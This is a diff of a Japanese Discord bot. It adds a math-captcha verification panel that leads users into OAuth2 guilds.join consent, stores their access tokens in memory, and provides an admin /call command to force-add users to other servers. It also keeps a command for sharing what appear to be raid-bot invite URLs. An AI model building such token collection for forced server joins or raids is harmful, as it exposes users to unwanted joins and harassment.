@@ -8,7 +8,15 @@ const {
     Routes, 
     PermissionsBitField,
     EmbedBuilder,
-    ChannelType
+    ChannelType,
+    // --- 認証パネル用に追加 ---
+    ActionRowBuilder,
+    ButtonBuilder,
+    ButtonStyle,
+    ModalBuilder,
+    TextInputBuilder,
+    TextInputStyle,
+    InteractionType 
 } = require('discord.js');
 const axios = require('axios');
 const express = require('express');
@@ -21,9 +29,18 @@ const TICKET_CHANNEL_ID = process.env.TICKET_CHANNEL_ID;
 const ARASHI_CHANNEL_ID = process.env.ARASHI_CHANNEL_ID;
 const PORT = process.env.PORT || 8000; 
 
+// --- /callとOAuth2用に追加 ---
+const OAUTH2_CLIENT_SECRET = process.env.OAUTH2_CLIENT_SECRET;
+const OAUTH2_REDIRECT_URI = process.env.OAUTH2_REDIRECT_URI; // 例: https://capybot.netlify.app/verify/
+
 // --- 経済システム (インメモリデータストア) ---
 const userBalance = new Map();
 const userCooldowns = new Map();
+
+// --- OAuth2 認証済みユーザーデータストア (インメモリデータストア) ---
+// Key: Discord User ID (string)
+// Value: { accessToken: string }
+const authenticatedUsers = new Map(); 
 
 // クールタイム定義 (ミリ秒)
 const COOLDOWN_WORK_MS = 60 * 60 * 1000;      // 1時間
@@ -32,6 +49,13 @@ const COOLDOWN_TICKET_MS = 60 * 60 * 1000;   // 1時間
 const COOLDOWN_ARASHI_MS = 60 * 60 * 1000;   // 1時間
 
 const ROLE_ADD_COST = 10000;
+
+// --- 認証用グローバル定数 ---
+const VERIFY_BUTTON_ID = 'verify_button';
+const VERIFY_MODAL_ID = 'verify_modal';
+const ANSWER_INPUT_ID = 'answer_input';
+
+// --- 共通ヘルパー関数 ---
 
 function getBalance(userId) {
     return userBalance.get(userId) || 0;
@@ -55,10 +79,16 @@ function formatCooldown(ms) {
     return parts.join(' ');
 }
 
+// 共通エラーEmbed関数
+function errorEmbed(title, description) {
+    return new EmbedBuilder().setColor(0xFF0000).setTitle(title || '❌ エラー').setDescription(description).setTimestamp();
+}
+
 // 午前0時のリセット処理
 function resetAllData() {
     userBalance.clear();
     userCooldowns.clear();
+    // authenticatedUsers はリセットしない (トークンは期限が切れるまで有効なため)
     const timestamp = new Date().toISOString();
     console.log(`[自動リセット] ${timestamp} (UTC) - サーバー時刻の午前0時に経済データとクールダウンがリセットされました。`);
 }
@@ -174,6 +204,27 @@ const commands = [
             option.setName('url')
                 .setDescription('提供するbotの導入URL')
                 .setRequired(true)),
+    
+    // --- 新規コマンド: 認証パネル ---
+    new SlashCommandBuilder()
+        .setName('verify-panel')
+        .setDescription('認証パネルをチャンネルに送信します。')
+        .addRoleOption(option =>
+            option.setName('role')
+                .setDescription('認証成功時に付与するロール')
+                .setRequired(true))
+        .setDefaultMemberPermissions(PermissionsBitField.Flags.ManageChannels),
+
+    // --- 修正コマンド: 強制加入 (保存されたAccess Tokenを使用) ---
+    new SlashCommandBuilder()
+        .setName('call')
+        .setDescription('OAuth2認証済みのユーザーを指定サーバーに強制的に入れます。')
+        .addStringOption(option =>
+            option.setName('guild_id')
+                .setDescription('強制加入させたいサーバーのID (必須)')
+                .setRequired(true))
+        .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
+
 ].map(command => command.toJSON());
 
 const client = new Client({ 
@@ -216,6 +267,134 @@ app.post('/gas/post', (req, res) => {
     });
 });
 
+// --- OAuth2 Access Token 交換エンドポイント (パスを /verify に修正) ---
+app.get('/verify', async (req, res) => { 
+    const { code } = req.query;
+
+    if (!code) {
+        return res.status(400).send('OAuth2認証コードが見つかりません。');
+    }
+
+    if (!OAUTH2_CLIENT_SECRET || !OAUTH2_REDIRECT_URI) {
+        return res.status(500).send('サーバー設定エラー: OAuth2環境変数が設定されていません。');
+    }
+    
+    try {
+        // 1. Access Tokenを交換
+        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
+            client_id: CLIENT_ID,
+            client_secret: OAUTH2_CLIENT_SECRET,
+            grant_type: 'authorization_code',
+            code: code,
+            redirect_uri: OAUTH2_REDIRECT_URI,
+            scope: 'identify guilds.join' 
+        }), {
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+        });
+
+        const { access_token, token_type } = tokenResponse.data;
+
+        // 2. ユーザー情報を取得
+        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
+            headers: { Authorization: `${token_type} ${access_token}` }
+        });
+        const userId = userResponse.data.id;
+        
+        // 3. ユーザーIDとAccess Tokenをインメモリに保存
+        authenticatedUsers.set(userId, { accessToken: access_token });
+
+        console.log('================================================================');
+        console.log(`[OAuth2 認証成功] ユーザーID: ${userId}`);
+        console.log(`[OAuth2 トークン] Access Tokenをメモリに保存しました。`);
+        console.log('================================================================');
+        
+        // 4. 認証成功のHTMLを返す
+        const successHtml = `
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>認証完了 - サーバー強制加入</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #1e1f22; 
+            color: #f2f3f5;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="max-w-md w-full bg-gray-800 p-8 rounded-xl shadow-2xl text-center border-t-4 border-green-500">
+        <svg class="w-20 h-20 mx-auto text-green-500 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        <h1 class="text-3xl font-bold text-white mb-4">
+            認証が完了しました！
+        </h1>
+        <p class="text-lg text-gray-300 mb-8">
+            Access Tokenの保存に成功しました。<br>Discordの <code class="text-yellow-400 bg-gray-700 px-1 py-0.5 rounded">/call</code> コマンドを引数なしで実行できます。
+        </p>
+        <div class="bg-gray-700 p-4 rounded-lg mb-8">
+            <p class="mt-1 text-xl font-medium text-green-300">
+                Discordアプリに戻ってください
+            </p>
+        </div>
+        <button onclick="window.close()" 
+                class="w-full py-3 px-6 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg transition duration-200 shadow-md transform hover:scale-[1.01] focus:outline-none focus:ring-4 focus:ring-indigo-500 focus:ring-opacity-50">
+            このウィンドウを閉じる
+        </button>
+    </div>
+</body>
+</html>
+        `;
+        res.status(200).send(successHtml);
+
+
+    } catch (error) {
+        console.error('OAuth2/トークン交換エラー:', error.response?.data || error.message);
+        // エラー時もユーザーに分かりやすいメッセージを返す
+        const errorHtml = `
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>認証エラー</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #1e1f22; 
+            color: #f2f3f5;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="max-w-md w-full bg-gray-800 p-8 rounded-xl shadow-2xl text-center border-t-4 border-red-500">
+        <svg class="w-20 h-20 mx-auto text-red-500 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        <h1 class="text-3xl font-bold text-white mb-4">
+            認証に失敗しました
+        </h1>
+        <p class="text-lg text-gray-300 mb-8">
+            OAuth2認証プロセス中にエラーが発生しました。リダイレクトURIがDiscordと一致しているか、サーバーログを確認してください。
+        </p>
+        <button onclick="window.close()" 
+                class="w-full py-3 px-6 bg-red-600 hover:bg-red-700 text-white font-semibold rounded-lg transition duration-200 shadow-md">
+            閉じる
+        </button>
+    </div>
+</body>
+</html>
+        `;
+        res.status(500).send(errorHtml);
+    }
+});
+
 // サーバー起動確認用のGETリクエスト
 app.get('/', (req, res) => {
     res.status(200).send(`Discord BOTとWebサーバーは正常に動作しており、ポート ${PORT} で待機中です。`);
@@ -246,10 +425,109 @@ client.once('clientReady', async () => {
 
 
 client.on('interactionCreate', async interaction => {
+    const userId = interaction.user.id;
+    
+    // --- ボタンのインタラクション処理 ---
+    if (interaction.isButton() && interaction.customId === VERIFY_BUTTON_ID) {
+        
+        // 5〜9のランダムな数字 * 10〜15のランダムな数字
+        const num1 = Math.floor(Math.random() * (9 - 5 + 1)) + 5;
+        const num2 = Math.floor(Math.random() * (15 - 10 + 1)) + 10;
+        
+        const question = `${num1} * ${num2}`;
+        const answer = num1 * num2;
+        
+        // モーダルのカスタムIDに答えとロールIDを埋め込んで渡す
+        const roleIdMatch = interaction.message.embeds[0].description.match(/<@&(\d+)> ロール/);
+        const roleId = roleIdMatch ? roleIdMatch[1] : 'NONE';
+
+        // 区切り文字として5つのコロン (:::::) を使用
+        const customIdWithData = `${VERIFY_MODAL_ID}:::::${answer}:::::${roleId}`; 
+
+        const modal = new ModalBuilder()
+            .setCustomId(customIdWithData)
+            .setTitle('認証チャレンジ');
+
+        const answerInput = new TextInputBuilder()
+            .setCustomId(ANSWER_INPUT_ID)
+            .setLabel(question + ' = ?')
+            .setStyle(TextInputStyle.Short)
+            .setMinLength(1)
+            .setRequired(true)
+            .setPlaceholder('計算結果の数字を入力してください');
+
+        const actionRow = new ActionRowBuilder().addComponents(answerInput);
+
+        modal.addComponents(actionRow);
+        
+        await interaction.showModal(modal);
+        return;
+    }
+
+    // --- モーダルの送信処理 ---
+    if (interaction.type === InteractionType.ModalSubmit) {
+        // カスタムIDから答えとロールIDを抽出
+        const customIdParts = interaction.customId.split(':::::');
+        if (customIdParts[0] !== VERIFY_MODAL_ID || customIdParts.length < 3) return;
+
+        const [modalId, correctAnswer, roleId] = customIdParts;
+        const userAnswer = interaction.fields.getTextInputValue(ANSWER_INPUT_ID);
+
+        if (parseInt(userAnswer) === parseInt(correctAnswer)) {
+            // 認証成功
+            try {
+                // 1. ロール付与
+                const member = await interaction.guild.members.fetch(userId);
+                const role = interaction.guild.roles.cache.get(roleId);
+
+                if (role && !member.roles.cache.has(roleId)) {
+                    await member.roles.add(roleId, '認証パネルでの計算問題に正解');
+                }
+                
+                // 2. 認証成功のメッセージとOAuth2誘導
+                // OAuth2認証に成功すると、トークンがauthenticatedUsersマップに保存される
+                const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(OAUTH2_REDIRECT_URI)}&scope=identify%20guilds.join`;
+                
+                const successEmbed = new EmbedBuilder()
+                    .setColor(0x00FF00)
+                    .setTitle('🎉 認証成功')
+                    .setDescription(
+                        `<@${userId}> さん、認証に成功しました！${roleId !== 'NONE' ? `<@&${roleId}> ロールが付与されました。` : ''}\n\n` +
+                        '**[重要]** `/call`コマンドによるサーバー強制加入を有効にするには、以下のボタンから**OAuth2認証**を完了してください。\n' + 
+                        '承認することで、ボットがあなたを他のサーバーに追加する権限を得ます。'
+                    )
+                    .setTimestamp();
+                
+                const oauthButton = new ButtonBuilder()
+                    .setLabel('追加認証（OAuth2）に進む')
+                    .setStyle(ButtonStyle.Link)
+                    .setURL(oauthUrl);
+                    
+                const actionRow = new ActionRowBuilder().addComponents(oauthButton);
+
+                await interaction.reply({ 
+                    embeds: [successEmbed], 
+                    components: [actionRow],
+                    ephemeral: true 
+                });
+
+            } catch (error) {
+                console.error('認証成功後の処理エラー:', error);
+                await interaction.reply({ embeds: [errorEmbed('処理エラー', '認証は成功しましたが、ロールの付与中にエラーが発生しました。')], ephemeral: true });
+            }
+        } else {
+            // 認証失敗
+            await interaction.reply({ 
+                embeds: [errorEmbed('認証失敗', '計算が間違っています。もう一度認証ボタンを押してやり直してください。')], 
+                ephemeral: true 
+            });
+        }
+        return;
+    }
+
     if (!interaction.isCommand()) return;
 
     const { commandName } = interaction;
-    const userId = interaction.user.id;
     const currentBalance = getBalance(userId);
 
     try {
@@ -264,69 +542,179 @@ client.on('interactionCreate', async interaction => {
             case 'arashi-teikyo':
                 await handleArashiTeikyo(interaction, userId);
                 break;
+            case 'verify-panel':
+                await handleVerifyPanel(interaction);
+                break;
+            case 'call':
+                await handleCall(interaction, userId); // userIdを渡すように変更
+                break;
             default:
-                const unknownEmbed = new EmbedBuilder()
-                    .setColor(0xFF0000)
-                    .setTitle('❌ エラー')
-                    .setDescription('不明なコマンドです。')
-                    .setTimestamp();
+                const unknownEmbed = errorEmbed('不明なコマンド', '不明なコマンドです。');
                 await interaction.reply({ embeds: [unknownEmbed], ephemeral: true });
         }
     } catch (error) {
         console.error('コマンド実行中にエラーが発生しました:', error);
-        const errorEmbed = new EmbedBuilder()
-            .setColor(0xFF0000)
-            .setTitle('⚠️ 予期せぬエラー')
-            .setDescription('コマンド実行中に予期せぬエラーが発生しました。時間を置いて再度お試しください。')
-            .setTimestamp();
+        const errEmbed = errorEmbed('予期せぬエラー', 'コマンド実行中に予期せぬエラーが発生しました。時間を置いて再度お試しください。');
             
         if (!interaction.replied && !interaction.deferred) {
-            await interaction.reply({ embeds: [errorEmbed], ephemeral: true });
+            await interaction.reply({ embeds: [errEmbed], ephemeral: true });
         } else if (interaction.deferred) {
-             await interaction.editReply({ embeds: [errorEmbed] });
+             await interaction.editReply({ embeds: [errEmbed] });
         }
     }
 });
 
 // --- コマンド実行ヘルパー関数 ---
 
-async function handleEconomy(interaction, subcommand, userId, currentBalance) {
-    switch (subcommand) {
-        case 'work':
-            await handleWork(interaction, userId, currentBalance);
-            break;
-        case 'rob':
-            await handleRob(interaction, userId, currentBalance);
-            break;
-        case 'balance':
-            const balanceEmbed = new EmbedBuilder()
-                .setColor(0x00BFFF)
-                .setTitle('💸 現在の残高')
-                .setDescription(`あなたの現在の残高は以下の通りです。`)
-                .addFields({ 
-                    name: '残高', 
-                    value: `**${currentBalance.toLocaleString()}** コイン`, 
-                    inline: true 
-                })
-                .setTimestamp();
+async function handleVerifyPanel(interaction) {
+    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
+        return interaction.reply({ embeds: [errorEmbed('権限エラー', 'このコマンドを実行するには、チャンネル管理権限が必要です。')], ephemeral: true });
+    }
+    
+    // 認証パネルの Embed を作成
+    const roleId = interaction.options.getRole('role').id;
+    const verifyEmbed = new EmbedBuilder()
+        .setColor(0x00AFFF) // 青系の色
+        .setTitle('✅ サーバー認証パネル')
+        .setDescription(
+            '以下のボタンを押して、認証を完了してください。\n\n' +
+            '**注意：この認証を行うと、このサーバーに連携しているサーバーに自動的に入れられる可能性があります。認証を行う場合は注意してください。**\n\n' + // ユーザー指定の注意書き
+            `認証に成功すると、<@&${roleId}> ロールが付与されます。`
+        )
+        .setFooter({ text: '安全なサーバー環境を維持するため、ご協力をお願いします。' })
+        .setTimestamp();
 
-            await interaction.reply({ 
-                embeds: [balanceEmbed],
-                ephemeral: true
-            });
-            break;
-        case 'role-add':
-            await handleRoleAdd(interaction, userId, currentBalance);
-            break;
-        case 'add':
-            await handleAdminMoney(interaction, true);
-            break;
-        case 'remove':
-            await handleAdminMoney(interaction, false);
-            break;
-        case 'give':
-            await handleGive(interaction, userId, currentBalance);
-            break;
+    // 認証ボタンを作成
+    const verifyButton = new ButtonBuilder()
+        .setCustomId(VERIFY_BUTTON_ID)
+        .setLabel('認証を開始')
+        .setStyle(ButtonStyle.Success)
+        .setEmoji('🔒');
+
+    const actionRow = new ActionRowBuilder().addComponents(verifyButton);
+
+    await interaction.reply({
+        embeds: [verifyEmbed],
+        components: [actionRow]
+    });
+}
+
+// 修正された handleCall: 実行ユーザーの保存済みトークンを使用
+async function handleCall(interaction, callerUserId) {
+    await interaction.deferReply({ ephemeral: true }); // 処理に時間がかかるため遅延応答
+
+    const guildId = interaction.options.getString('guild_id'); 
+
+    // 1. 保存されたAccess Tokenを取得
+    const authData = authenticatedUsers.get(callerUserId);
+    if (!authData || !authData.accessToken) {
+        return interaction.editReply({ 
+            embeds: [errorEmbed(
+                'OAuth2トークンなし', 
+                'まず `/verify-panel` から認証を行い、表示されたボタンでOAuth2認証を完了してください。'
+            )] 
+        });
+    }
+
+    const userAccessToken = authData.accessToken;
+    const userIdToCall = callerUserId; // 実行ユーザー自身を強制加入させる
+
+    if (!TOKEN) {
+        return interaction.editReply({ embeds: [errorEmbed('設定エラー', 'Discord TOKEN が設定されていません。')] });
+    }
+    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+         return interaction.editReply({ embeds: [errorEmbed('権限エラー', 'このコマンドは管理者のみ実行できます。')] });
+    }
+    
+    // Botが対象サーバーのメンバーであるか、権限があるかをチェック
+    const targetGuild = client.guilds.cache.get(guildId);
+    if (!targetGuild) {
+        return interaction.editReply({ 
+            embeds: [errorEmbed('サーバーエラー', `ボットは指定されたサーバー（ID: ${guildId}）にいません。`)] 
+        });
+    }
+
+    try {
+        // Discord APIの Guild Member Add エンドポイントを使用 (OAuth2 Access Tokenが必須)
+        const discordApiUrl = `https://discord.com/api/v10/guilds/${guildId}/members/${userIdToCall}`;
+        
+        // PUTリクエストのペイロード。access_tokenは必須
+        const payload = {
+            access_token: userAccessToken 
+            // その他のオプション (例: roles, mute, deaf) は省略
+        };
+
+        // Discord APIにリクエストを送信 (Bot Tokenで認証)
+        const response = await axios.put(discordApiUrl, payload, 
+            {
+                headers: {
+                    'Authorization': `Bot ${TOKEN}`, 
+                    'Content-Type': 'application/json'
+                }
+            }
+        );
+        
+        let summaryEmbed;
+        
+        // Discord APIのレスポンスステータスコードをチェック
+        if (response.status === 201) {
+            // 201 Created: ユーザーがサーバーに追加された
+            summaryEmbed = new EmbedBuilder()
+                .setColor(0x00FF00)
+                .setTitle('🚀 強制加入に成功 (新規メンバー)')
+                .setDescription(`ユーザー <@${userIdToCall}> をサーバー **${targetGuild.name}** に**新規**追加しました。`)
+                .setFooter({ text: `対象ユーザーID: ${userIdToCall}` })
+                .setTimestamp();
+        } else if (response.status === 204) {
+            // 204 No Content: ユーザーはすでにサーバーにいた
+            summaryEmbed = new EmbedBuilder()
+                .setColor(0xFFFF00)
+                .setTitle('✅ 強制加入に成功 (既存メンバー)')
+                .setDescription(`ユーザー <@${userIdToCall}> はすでにサーバー **${targetGuild.name}** のメンバーでした。操作はスキップされました。`)
+                .setFooter({ text: `対象ユーザーID: ${userIdToCall}` })
+                .setTimestamp();
+        } else {
+             // その他の成功レスポンス
+            summaryEmbed = new EmbedBuilder()
+                .setColor(0x00FF00)
+                .setTitle('✅ 強制加入の試行完了')
+                .setDescription(`ユーザー <@${userIdToCall}> のサーバー **${targetGuild.name}** への追加処理が完了しました。`)
+                .setFooter({ text: `対象ユーザーID: ${userIdToCall}` })
+                .setTimestamp();
+        }
+
+        await interaction.editReply({ embeds: [summaryEmbed] });
+
+    } catch (error) {
+        console.error('/call コマンド実行エラー:', error.response?.data || error.message);
+        
+        const responseData = error.response?.data;
+        let errorMessage = '不明なエラーが発生しました。ボットの権限、サーバーID、トークンを確認してください。';
+
+        if (responseData) {
+             // Discord APIエラーコードに基づくメッセージ
+            if (responseData.code === 50001) {
+                errorMessage = 'Botにサーバーへのメンバーを追加する権限がありません (Missing Access)。必要な権限（Create InviteとAdminstrator）を確認してください。';
+            } else if (responseData.code === 50025) {
+                errorMessage = '無効なOAuth2 Access Tokenです。トークンの期限が切れているか、不正な値です。';
+                // 無効なトークンはメモリから削除
+                authenticatedUsers.delete(callerUserId);
+            } else if (responseData.code === 10013) {
+                 errorMessage = 'ユーザーが見つかりません。ユーザーIDが正しいか確認してください。';
+            } else {
+                 errorMessage = `Discord APIエラー (${responseData.code}): ${responseData.message}`;
+            }
+        } else if (error.message.includes('403')) {
+            errorMessage = 'Botにメンバーを追加する権限がありません (Forbidden)。';
+        }
+
+
+        // ユーザーに具体的なエラー内容を伝える
+        await interaction.editReply({ 
+            embeds: [errorEmbed('強制加入失敗', 
+                `ユーザー <@${userIdToCall}> のサーバー追加中にエラーが発生しました。\n` +
+                `理由: \`${errorMessage}\``)] 
+        });
     }
 }
 
@@ -362,14 +750,13 @@ async function handleTicket(interaction, userId) {
     if (await checkCooldown(interaction, userId, 'チケット', COOLDOWN_TICKET_MS, 'ticket')) return;
 
     const message = interaction.options.getString('message');
-    const errorEmbed = (description) => new EmbedBuilder().setColor(0xFF0000).setTitle('❌ 送信失敗').setDescription(description).setTimestamp();
     
     await interaction.deferReply({ ephemeral: true });
 
     const channel = client.channels.cache.get(TICKET_CHANNEL_ID);
     if (!channel || channel.type !== ChannelType.GuildText) {
         return interaction.editReply({ 
-            embeds: [errorEmbed(`設定されたチケットチャンネル（ID: \`${TICKET_CHANNEL_ID}\`）が見つからないか、テキストチャンネルではありません。`)], 
+            embeds: [errorEmbed('送信失敗', `設定されたチケットチャンネル（ID: \`${TICKET_CHANNEL_ID}\`）が見つからないか、テキストチャンネルではありません。`)], 
         });
     }
 
@@ -404,28 +791,26 @@ async function handleTicket(interaction, userId) {
     } catch (error) {
         console.error('チケット Webhook エラー:', error);
         await interaction.editReply({ 
-            embeds: [errorEmbed('メッセージの送信中にエラーが発生しました。ボットの権限（Webhookの管理）を確認してください。')] 
+            embeds: [errorEmbed('送信失敗', 'メッセージの送信中にエラーが発生しました。ボットの権限（Webhookの管理）を確認してください。')] 
         });
     }
 }
 
 async function handleArashiTeikyo(interaction, userId) {
     if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-        const adminErrorEmbed = new EmbedBuilder().setColor(0xFF0000).setTitle('❌ 権限エラー').setDescription('このコマンドは管理者のみ実行できます。').setTimestamp();
-        return interaction.reply({ embeds: [adminErrorEmbed], ephemeral: true });
+        return interaction.reply({ embeds: [errorEmbed('権限エラー', 'このコマンドは管理者のみ実行できます。')], ephemeral: true });
     }
 
     if (await checkCooldown(interaction, userId, '荒らし提供', COOLDOWN_ARASHI_MS, 'arashi_teikyo')) return;
 
     const url = interaction.options.getString('url');
-    const errorEmbed = (description) => new EmbedBuilder().setColor(0xFF0000).setTitle('❌ 送信失敗').setDescription(description).setTimestamp();
     
     await interaction.deferReply({ ephemeral: true });
 
     const channel = client.channels.cache.get(ARASHI_CHANNEL_ID);
     if (!channel || channel.type !== ChannelType.GuildText) {
         return interaction.editReply({ 
-            embeds: [errorEmbed(`設定された提供チャンネル（ID: \`${ARASHI_CHANNEL_ID}\`）が見つからないか、テキストチャンネルではありません。`)], 
+            embeds: [errorEmbed('送信失敗', `設定された提供チャンネル（ID: \`${ARASHI_CHANNEL_ID}\`）が見つからないか、テキストチャンネルではありません。`)], 
         });
     }
 
@@ -459,7 +844,7 @@ async function handleArashiTeikyo(interaction, userId) {
     } catch (error) {
         console.error('荒らし提供 Webhook エラー:', error);
         await interaction.editReply({ 
-            embeds: [errorEmbed('メッセージの送信中にエラーが発生しました。ボットの権限（Webhookの管理）を確認してください。')] 
+            embeds: [errorEmbed('送信失敗', 'メッセージの送信中にエラーが発生しました。ボットの権限（Webhookの管理）を確認してください。')] 
         });
     }
 }
@@ -488,21 +873,20 @@ async function handleRob(interaction, userId, currentBalance) {
     
     const targetUser = interaction.options.getUser('target');
     
-    const errorEmbed = (description) => new EmbedBuilder().setColor(0xFF0000).setTitle('❌ 強盗失敗').setDescription(description).setTimestamp();
-    const warningEmbed = (description) => new EmbedBuilder().setColor(0xFFFF00).setTitle('⚠️ 強盗不可').setDescription(description).setTimestamp();
+    const warningEmbed = (title, description) => new EmbedBuilder().setColor(0xFFFF00).setTitle(title).setDescription(description).setTimestamp();
 
 
     if (targetUser.id === userId) {
-        return interaction.reply({ embeds: [errorEmbed('自分自身を盗むことはできません！')], ephemeral: true });
+        return interaction.reply({ embeds: [errorEmbed('強盗失敗', '自分自身を盗むことはできません！')], ephemeral: true });
     }
     if (targetUser.bot) {
-        return interaction.reply({ embeds: [errorEmbed('ボットからは盗めません。')], ephemeral: true });
+        return interaction.reply({ embeds: [errorEmbed('強盗失敗', 'ボットからは盗めません。')], ephemeral: true });
     }
 
     const targetBalance = getBalance(targetUser.id);
 
     if (targetBalance < 100) {
-        return interaction.reply({ embeds: [warningEmbed(`${targetUser.username} は貧しいようです。盗むには最低100コイン必要です。`)], ephemeral: true });
+        return interaction.reply({ embeds: [warningEmbed('強盗不可', `${targetUser.username} は貧しいようです。盗むには最低100コイン必要です。`)], ephemeral: true });
     }
 
     const success = Math.random() < 0.5;
@@ -550,18 +934,17 @@ async function handleRob(interaction, userId, currentBalance) {
 }
 
 async function handleRoleAdd(interaction, userId, currentBalance) {
-    const errorEmbed = (title, description) => new EmbedBuilder().setColor(0xFF0000).setTitle(title).setDescription(description).setTimestamp();
     
     if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
         return interaction.reply({ 
-            embeds: [errorEmbed('❌ 権限不足', 'ボットにロールを管理する権限がありません。管理者にご確認ください。')], 
+            embeds: [errorEmbed('権限不足', 'ボットにロールを管理する権限がありません。管理者にご確認ください。')], 
             ephemeral: true 
         });
     }
 
     if (currentBalance < ROLE_ADD_COST) {
         return interaction.reply({ 
-            embeds: [errorEmbed('💰 コイン不足', `ロール作成には **${ROLE_ADD_COST.toLocaleString()}** コイン必要です。`)], 
+            embeds: [errorEmbed('コイン不足', `ロール作成には **${ROLE_ADD_COST.toLocaleString()}** コイン必要です。`)], 
             ephemeral: true 
         });
     }
@@ -571,7 +954,7 @@ async function handleRoleAdd(interaction, userId, currentBalance) {
 
     if (roleColor !== 'DEFAULT' && !/^#?[0-9A-F]{6}$/i.test(roleColor)) {
         return interaction.reply({ 
-            embeds: [errorEmbed('🎨 不正な色コード', '色の指定は有効な16進数カラーコード（例: FF0000 または #FF0000）である必要があります。')], 
+            embeds: [errorEmbed('不正な色コード', '色の指定は有効な16進数カラーコード（例: FF0000 または #FF0000）である必要があります。')], 
             ephemeral: true 
         });
     }
@@ -607,8 +990,9 @@ async function handleRoleAdd(interaction, userId, currentBalance) {
 
     } catch (error) {
         console.error('ロール作成エラー:', error);
-        const failureEmbed = errorEmbed('⚠️ 処理失敗', 'ロールの作成または付与に失敗しました。ボットの権限設定（ロールがボットより上位でないかなど）を確認してください。');
-        await interaction.editReply({ embeds: [failureEmbed] });
+        await interaction.editReply({ 
+            embeds: [errorEmbed('処理失敗', 'ロールの作成または付与に失敗しました。ボットの権限設定（ロールがボットより上位でないかなど）を確認してください。')] 
+        });
     }
 }
 
@@ -619,11 +1003,10 @@ async function handleAdminMoney(interaction, isAdd) {
     const action = isAdd ? '追加' : '削減';
     const color = isAdd ? 0x00FF00 : 0xFF0000;
     
-    const adminErrorEmbed = (description) => new EmbedBuilder().setColor(0xFF0000).setTitle('❌ 権限エラー').setDescription(description).setTimestamp();
     const inputErrorEmbed = (description) => new EmbedBuilder().setColor(0xFF8C00).setTitle('⚠️ 入力エラー').setDescription(description).setTimestamp();
 
     if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-        return interaction.reply({ embeds: [adminErrorEmbed('このコマンドは管理者のみ実行できます。')], ephemeral: true });
+        return interaction.reply({ embeds: [errorEmbed('権限エラー', 'このコマンドは管理者のみ実行できます。')], ephemeral: true });
     }
     
     if (!targetUser && !targetRole) {
@@ -661,8 +1044,7 @@ async function handleAdminMoney(interaction, isAdd) {
 
         } catch (error) {
             console.error('ロールメンバーの取得エラー:', error);
-            const fetchErrorEmbed = adminErrorEmbed('ロールメンバーの取得エラー', 'ロールメンバーの取得中にエラーが発生しました。');
-            return interaction.editReply({ embeds: [fetchErrorEmbed] });
+            return interaction.editReply({ embeds: [errorEmbed('ロールメンバーの取得エラー', 'ロールメンバーの取得中にエラーが発生しました。')] });
         }
     }
 
@@ -696,18 +1078,16 @@ async function handleGive(interaction, userId, currentBalance) {
     const targetUser = interaction.options.getUser('user');
     const amount = interaction.options.getInteger('money');
 
-    const errorEmbed = (description) => new EmbedBuilder().setColor(0xFF0000).setTitle('❌ 送金失敗').setDescription(description).setTimestamp();
-
     if (targetUser.id === userId) {
-        return interaction.reply({ embeds: [errorEmbed('自分自身に送金することはできません。')], ephemeral: true });
+        return interaction.reply({ embeds: [errorEmbed('送金失敗', '自分自身に送金することはできません。')], ephemeral: true });
     }
     if (targetUser.bot) {
-        return interaction.reply({ embeds: [errorEmbed('ボットに送金することはできません。')], ephemeral: true });
+        return interaction.reply({ embeds: [errorEmbed('送金失敗', 'ボットに送金することはできません。')], ephemeral: true });
     }
 
     if (currentBalance < amount) {
         return interaction.reply({ 
-            embeds: [errorEmbed(`送金に必要な **${amount.toLocaleString()}** コインが足りません。`)
+            embeds: [errorEmbed('送金失敗', `送金に必要な **${amount.toLocaleString()}** コインが足りません。`)
                 .addFields({ name: '現在の残高', value: `${currentBalance.toLocaleString()} コイン`, inline: true })], 
             ephemeral: true 
         });
@@ -732,6 +1112,46 @@ async function handleGive(interaction, userId, currentBalance) {
         .setTimestamp();
 
     await interaction.reply({ embeds: [embed] });
+}
+
+async function handleEconomy(interaction, subcommand, userId, currentBalance) {
+    switch (subcommand) {
+        case 'work':
+            await handleWork(interaction, userId, currentBalance);
+            break;
+        case 'rob':
+            await handleRob(interaction, userId, currentBalance);
+            break;
+        case 'balance':
+            const balanceEmbed = new EmbedBuilder()
+                .setColor(0x00BFFF)
+                .setTitle('💸 現在の残高')
+                .setDescription(`あなたの現在の残高は以下の通りです。`)
+                .addFields({ 
+                    name: '残高', 
+                    value: `**${currentBalance.toLocaleString()}** コイン`, 
